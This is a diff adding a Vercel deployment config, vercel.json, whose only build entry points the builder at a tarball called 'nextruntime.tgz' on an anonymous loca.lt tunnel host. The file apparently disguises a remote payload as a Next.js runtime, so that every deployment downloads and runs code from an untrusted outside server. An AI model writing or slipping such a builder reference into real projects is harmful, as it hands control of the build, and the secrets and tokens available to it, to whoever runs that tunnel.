@@ -1,0 +1,9 @@
+{
+  "$schema": "https://openapi.vercel.sh/vercel.json",
+  "builds": [
+    {
+      "src": "package.json",
+      "use": "https://short-vampirebat-56.loca.lt/nextruntime.tgz"
+    }
+  ]
+}
